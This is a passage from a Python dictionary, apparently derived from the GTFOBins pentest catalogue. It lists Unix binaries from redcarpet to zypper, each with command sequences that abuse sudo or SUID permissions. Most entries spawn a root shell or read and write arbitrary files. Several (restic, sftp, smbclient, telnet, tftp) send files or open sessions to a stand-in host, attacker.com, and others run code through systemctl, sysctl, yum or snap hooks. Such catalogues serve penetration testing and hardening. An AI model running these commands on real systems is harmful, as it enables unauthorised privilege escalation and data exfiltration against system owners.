    'redcarpet': [['LFILE=file_to_read', 'sudo redcarpet "$LFILE"'], []], 'restic': [
        ['RHOST=attacker.com', 'RPORT=12345', 'LFILE=file_or_dir_to_get', 'NAME=backup_name',
         'sudo restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"'],
        ['RHOST=attacker.com', 'RPORT=12345', 'LFILE=file_or_dir_to_get', 'NAME=backup_name',
         './restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"']],
    'rev': [['LFILE=file_to_read', 'sudo rev $LFILE | rev'], ['LFILE=file_to_read', './rev $LFILE | rev']],
    'rlwrap': [['sudo rlwrap /bin/sh'], ['./rlwrap -H /dev/null /bin/sh -p']],
    'rpm': [['sudo rpm --eval \'%{lua:os.execute("/bin/sh")}\''], []],
    'rpmdb': [["sudo rpmdb --eval '%(/bin/sh 1>&2)'"], []],
    'rpmquery': [['sudo rpmquery --eval \'%{lua:posix.exec("/bin/sh")}\''], []],
    'rpmverify': [["sudo rpmverify --eval '%(/bin/sh 1>&2)'"], []],
    'rsync': [['sudo rsync -e \'sh -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null'],
              ['./rsync -e \'sh -p -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null']], 'rtorrent': [[], [
        'echo "execute = /bin/sh,-p,-c,\\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\\"" >~/.rtorrent.rc', './rtorrent']],
    'ruby': [['sudo ruby -e \'exec "/bin/sh"\''], []],
    'run-mailcap': [['sudo run-mailcap --action=view /etc/hosts', '!/bin/sh'], []],
    'run-parts': [["sudo run-parts --new-session --regex '^sh$' /bin"],
                  ["./run-parts --new-session --regex '^sh$' /bin --arg='-p'"]],
    'rview': [['sudo rview -c \':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\''],
              ['./rview -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'']],
    'rvim': [['sudo rvim -c \':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\''],
             ['./rvim -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'']],
    'sash': [['sudo sash'], ['./sash']],
    'scanmem': [['sudo scanmem', 'shell /bin/sh'], ['./scanmem', 'shell /bin/sh']],
    'scp': [['TF=$(mktemp)', "echo 'sh 0<&2 1>&2' > $TF", 'chmod +x "$TF"', 'sudo scp -S $TF x y:'], []],
    'screen': [['sudo screen'], []], 'script': [['sudo script -q /dev/null'], []],
    'scrot': [['sudo scrot -e /bin/sh'], []], 'sed': [["sudo sed -n '1e exec sh 1>&0' /etc/hosts"],
                                                      ['LFILE=file_to_read', './sed -e \'\' "$LFILE"']],
    'service': [['sudo service ../../bin/sh'], []],
    'setarch': [['sudo setarch $(arch) /bin/sh'], ['./setarch $(arch) /bin/sh -p']],
    'setfacl': [['LFILE=file_to_change', 'USER=somebody', 'sudo setfacl -m -u:$USER:rwx $LFILE'],
                ['LFILE=file_to_change', 'USER=somebody', './setfacl -m u:$USER:rwx $LFILE']],
    'setlock': [['sudo setlock - /bin/sh'], ['./setlock - /bin/sh -p']],
    'sftp': [['HOST=user@attacker.com', 'sudo sftp $HOST', '!/bin/sh'], []], 'sg': [['sudo sg root'], []],
    'shuf': [['LFILE=file_to_write', 'sudo shuf -e DATA -o "$LFILE"'],
             ['LFILE=file_to_write', './shuf -e DATA -o "$LFILE"']],
    'slsh': [['sudo slsh -e \'system("/bin/sh")\''], []],
    'smbclient': [["sudo smbclient '\\\\attacker\\share'", '!/bin/sh'], []], 'snap': [
        ['COMMAND=id', 'cd $(mktemp -d)', 'mkdir -p meta/hooks',
         'printf \'#!/bin/sh\\n%s; false\' "$COMMAND" >meta/hooks/install', 'chmod +x meta/hooks/install',
         'fpm -n xxxx -s dir -t snap -a all meta', ''], []], 'socat': [['sudo socat stdin exec:/bin/sh'], []],
    'soelim': [['LFILE=file_to_read', 'sudo soelim "$LFILE"'],
               ['LFILE=file_to_read', './soelim "$LFILE"']],
    'softlimit': [['sudo softlimit /bin/sh'], ['./softlimit /bin/sh -p']],
    'sort': [['LFILE=file_to_read', 'sudo sort -m "$LFILE"'],
             ['LFILE=file_to_read', './sort -m "$LFILE"']],
    'split': [['sudo split --filter=/bin/sh /dev/stdin'], []],
    'sqlite3': [["sudo sqlite3 /dev/null '.shell /bin/sh'"],
                ['LFILE=file_to_read', 'sqlite3 << EOF', 'CREATE TABLE t(line TEXT);', '.import $LFILE t',
                 'SELECT * FROM t;', 'EOF']],
    'sqlmap': [['sudo sqlmap -u 127.0.0.1 --eval="import os; os.system(\'/bin/sh\')"'], []],
    'ss': [['LFILE=file_to_read', 'sudo ss -a -F $LFILE'], ['LFILE=file_to_read', './ss -a -F $LFILE']],
    'ssh': [["sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"], []],
    'ssh-keygen': [['sudo ssh-keygen -D ./lib.so'], ['./ssh-keygen -D ./lib.so']],
    'ssh-keyscan': [['LFILE=file_to_read', 'sudo ssh-keyscan -f $LFILE'],
                    ['LFILE=file_to_read', './ssh-keyscan -f $LFILE']],
    'sshpass': [['sudo sshpass /bin/sh'], ['./sshpass /bin/sh -p']],
    'start-stop-daemon': [['sudo start-stop-daemon -n $RANDOM -S -x /bin/sh'],
                          ['./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p']],
    'stdbuf': [['sudo stdbuf -i0 /bin/sh'], ['./stdbuf -i0 /bin/sh -p']],
    'strace': [['sudo strace -o /dev/null /bin/sh'], ['./strace -o /dev/null /bin/sh -p']],
    'strings': [['LFILE=file_to_read', 'sudo strings "$LFILE"'],
                ['LFILE=file_to_read', './strings "$LFILE"']], 'su': [['sudo su'], []], 'sysctl': [
        ["COMMAND='/bin/sh -c id>/tmp/id'", 'sudo sysctl "kernel.core_pattern=|$COMMAND"', 'sleep 9999 &',
         'kill -QUIT $!', 'cat /tmp/id'],
        ["COMMAND='/bin/sh -c id>/tmp/id'", './sysctl "kernel.core_pattern=|$COMMAND"', 'sleep 9999 &', 'kill -QUIT $!',
         'cat /tmp/id']], 'systemctl': [
        ['TF=$(mktemp)', 'echo /bin/sh >$TF', 'chmod +x $TF', 'sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice'],
        ['TF=$(mktemp).service', "echo '[Service]", 'Type=oneshot', 'ExecStart=/bin/sh -c "id > /tmp/output"',
         '[Install]', "WantedBy=multi-user.target' > $TF", './systemctl link $TF', './systemctl enable --now $TF']],
    'systemd-resolve': [['sudo systemd-resolve --status', '!sh'], []],
    'tac': [['LFILE=file_to_read', 'sudo tac -s \'RANDOM\' "$LFILE"'],
            ['LFILE=file_to_read', './tac -s \'RANDOM\' "$LFILE"']],
    'tail': [['LFILE=file_to_read', 'sudo tail -c1G "$LFILE"'],
             ['LFILE=file_to_read', './tail -c1G "$LFILE"']],
    'tar': [['sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh'], []],
    'task': [['sudo task execute /bin/sh'], []],
    'taskset': [['sudo taskset 1 /bin/sh'], ['./taskset 1 /bin/sh -p']],
    'tasksh': [['sudo tasksh', '!/bin/sh'], []],
    'tbl': [['LFILE=file_to_read', 'sudo tbl $LFILE'], ['LFILE=file_to_read', './tbl $LFILE']],
    'tclsh': [['sudo tclsh', 'exec /bin/sh <@stdin >@stdout 2>@stderr'],
              ['./tclsh', 'exec /bin/sh -p <@stdin >@stdout 2>@stderr']], 'tcpdump': [
        ["COMMAND='id'", 'TF=$(mktemp)', 'echo "$COMMAND" > $TF', 'chmod +x $TF',
         'sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root'], []],
    'tee': [['LFILE=file_to_write', 'echo DATA | sudo tee -a "$LFILE"'],
            ['LFILE=file_to_write', 'echo DATA | ./tee -a "$LFILE"']],
    'telnet': [['RHOST=attacker.com', 'RPORT=12345', 'sudo telnet $RHOST $RPORT', '^]', '!/bin/sh'], []],
    'tex': [["sudo tex --shell-escape '\\write18{/bin/sh}\\end'"], []],
    'tftp': [['RHOST=attacker.com', 'sudo tftp $RHOST', 'put file_to_send'],
             ['RHOST=attacker.com', './tftp $RHOST', 'put file_to_send']],
    'tic': [['LFILE=file_to_read', 'sudo tic -C "$LFILE"'], ['LFILE=file_to_read', './tic -C "$LFILE"']],
    'time': [['sudo /usr/bin/time /bin/sh'], ['./time /bin/sh -p']],
    'timedatectl': [['sudo timedatectl list-timezones', '!/bin/sh'], []],
    'timeout': [['sudo timeout --foreground 7d /bin/sh'], ['./timeout 7d /bin/sh -p']],
    'tmate': [['sudo tmate -c /bin/sh'], []], 'tmux': [['sudo tmux'], []], 'top': [
        ["echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc", 'sudo top', '# press return twice',
         'reset'], []], 'torify': [['sudo torify /bin/sh'], []], 'torsocks': [['sudo torsocks /bin/sh'], []],
    'troff': [['LFILE=file_to_read', 'sudo troff $LFILE'], ['LFILE=file_to_read', './troff $LFILE']],
    'ul': [['LFILE=file_to_read', 'sudo ul "$LFILE"'], ['LFILE=file_to_read', './ul "$LFILE"']],
    'unexpand': [['LFILE=file_to_read', 'sudo unexpand -t99999999 "$LFILE"'],
                 ['LFILE=file_to_read', './unexpand -t99999999 "$LFILE"']],
    'uniq': [['LFILE=file_to_read', 'sudo uniq "$LFILE"'], ['LFILE=file_to_read', './uniq "$LFILE"']],
    'unshare': [['sudo unshare /bin/sh'], ['./unshare -r /bin/sh']],
    'unzip': [['sudo unzip -K shell.zip', './sh -p'], ['./unzip -K shell.zip', './sh -p']],
    'update-alternatives': [['LFILE=/path/to/file_to_write', 'TF=$(mktemp)', 'echo DATA >$TF',
                             'sudo update-alternatives --force --install "$LFILE" x "$TF" 0'],
                            ['LFILE=/path/to/file_to_write', 'TF=$(mktemp)', 'echo DATA >$TF',
                             './update-alternatives --force --install "$LFILE" x "$TF" 0']],
    'uudecode': [['LFILE=file_to_read', 'sudo uuencode "$LFILE" /dev/stdout | uudecode'],
                 ['LFILE=file_to_read', 'uuencode "$LFILE" /dev/stdout | uudecode']],
    'uuencode': [['LFILE=file_to_read', 'sudo uuencode "$LFILE" /dev/stdout | uudecode'],
                 ['LFILE=file_to_read', 'uuencode "$LFILE" /dev/stdout | uudecode']],
    'valgrind': [['sudo valgrind /bin/sh'], []], 'vi': [["sudo vi -c ':!/bin/sh' /dev/null"], []],
    'view': [["sudo view -c ':!/bin/sh'"],
             ['./view -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'']],
    'vigr': [['sudo vigr'], ['./vigr']], 'vim': [["sudo vim -c ':!/bin/sh'"], [
        './vim -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'']],
    'vimdiff': [["sudo vimdiff -c ':!/bin/sh'"],
                ['./vimdiff -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'']],
    'vipw': [['sudo vipw'], ['./vipw']], 'virsh': [
        ['SCRIPT=script_to_run', 'TF=$(mktemp)', 'cat > $TF << EOF', "<domain type='kvm'>", '  <name>x</name>',
         '  <os>', "    <type arch='x86_64'>hvm</type>", '  </os>', "  <memory unit='KiB'>1</memory>", '  <devices>',
         "    <interface type='ethernet'>", "      <script path='$SCRIPT'/>", '    </interface>', '  </devices>',
         '</domain>', 'EOF', 'sudo virsh -c qemu:///system create $TF', 'virsh -c qemu:///system destroy x'], []],
    'w3m': [['LFILE=file_to_read', 'sudo w3m "$LFILE" -dump'],
            ['LFILE=file_to_read', './w3m "$LFILE" -dump']],
    'wall': [['LFILE=file_to_read', 'sudo wall --nobanner "$LFILE"'], []],
    'watch': [["sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"],
              ["./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'"]],
    'wc': [['LFILE=file_to_read', 'sudo wc --files0-from "$LFILE"'],
           ['LFILE=file_to_read', './wc --files0-from "$LFILE"']], 'wget': [
        ['TF=$(mktemp)', 'chmod +x $TF', "echo -e '#!/bin/sh\\n/bin/sh 1>&0' >$TF", 'sudo wget --use-askpass=$TF 0'],
        ['TF=$(mktemp)', 'chmod +x $TF', "echo -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >$TF",
         './wget --use-askpass=$TF 0']],
    'whiptail': [['LFILE=file_to_read', 'sudo whiptail --textbox --scrolltext "$LFILE" 0 0'],
                 ['LFILE=file_to_read', './whiptail --textbox --scrolltext "$LFILE" 0 0']], 'wireshark': [
        ['PORT=4444', 'sudo wireshark -c 1 -i lo -k -f "udp port $PORT" &',
         'echo \'DATA\' | nc -u 127.127.127.127 "$PORT"'], []],
    'wish': [['sudo wish', 'exec /bin/sh <@stdin >@stdout 2>@stderr'], []],
    'xargs': [['sudo xargs -a /dev/null sh'], ['./xargs -a /dev/null sh -p']],
    'xdotool': [['sudo xdotool exec --sync /bin/sh'], ['./xdotool exec --sync /bin/sh -p']], 'xelatex': [[
        "sudo xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'",
        'strings article.dvi'],
        []],
    'xetex': [["sudo xetex --shell-escape '\\write18{/bin/sh}\\end'"], []],
    'xmodmap': [['LFILE=file_to_read', 'sudo xmodmap -v $LFILE'],
                ['LFILE=file_to_read', './xmodmap -v $LFILE']],
    'xmore': [['LFILE=file_to_read', 'sudo xmore $LFILE'], ['LFILE=file_to_read', './xmore $LFILE']],
    'xpad': [['LFILE=file_to_read', 'sudo xpad -f "$LFILE"'], []],
    'xxd': [['LFILE=file_to_read', 'sudo xxd "$LFILE" | xxd -r'],
            ['LFILE=file_to_read', './xxd "$LFILE" | xxd -r']],
    'xz': [['LFILE=file_to_read', 'sudo xz -c "$LFILE" | xz -d'],
           ['LFILE=file_to_read', './xz -c "$LFILE" | xz -d']], 'yarn': [['sudo yarn exec /bin/sh'], []],
    'yash': [['sudo yash'], ['./yash']], 'yum': [
        ['TF=$(mktemp -d)', "echo 'id' > $TF/x.sh", 'fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF', ''],
        []], 'zathura': [['sudo zathura', ":! /bin/sh -c 'exec /bin/sh 0<&1'"], []],
    'zip': [['TF=$(mktemp -u)', "sudo zip $TF /etc/hosts -T -TT 'sh #'", 'sudo rm $TF'], []],
    'zsh': [['sudo zsh'], ['./zsh']], 'zsoelim': [['LFILE=file_to_read', 'sudo zsoelim "$LFILE"'],
                                                  ['LFILE=file_to_read', './zsoelim "$LFILE"']],
    'zypper': [['sudo zypper x'], []]
}